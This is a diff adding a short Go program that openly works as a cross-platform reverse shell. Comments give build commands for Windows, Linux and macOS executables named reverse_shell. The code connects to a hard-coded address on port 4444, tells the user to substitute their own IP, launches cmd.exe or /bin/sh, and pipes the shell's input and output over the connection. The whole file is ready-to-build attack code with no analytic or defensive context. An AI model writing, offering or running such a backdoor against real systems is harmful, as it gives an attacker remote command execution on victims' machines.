@@ -1,0 +1,39 @@
+package main
+// Create the executable first using the following syntax, code itself does not need changes
+// For Windows: GOOS=windows GOARCH=amd64 go build -o reverse_shell.exe code.go
+// For Linux: GOOS=linux GOARCH=amd64 go build -o reverse_shell code.go
+// For MacOS: GOOS=darwin GOARCH=amd64 go build -o reverse_shell code.go
+
+import (
+	"net"
+	"os/exec"
+	"runtime"
+)
+
+func main() {
+	// Replace with your IP and port
+	conn, err := net.Dial("tcp", "192.168.244.131:4444")
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	var cmd *exec.Cmd
+
+	// Detect the operating system and execute the appropriate shell
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd.exe")
+	case "linux", "darwin": // linux and macOS both use /bin/sh by default
+		cmd = exec.Command("/bin/sh")
+	default:
+		return
+	}
+
+	// Redirect input/output to the connection
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	cmd.Run()
+}
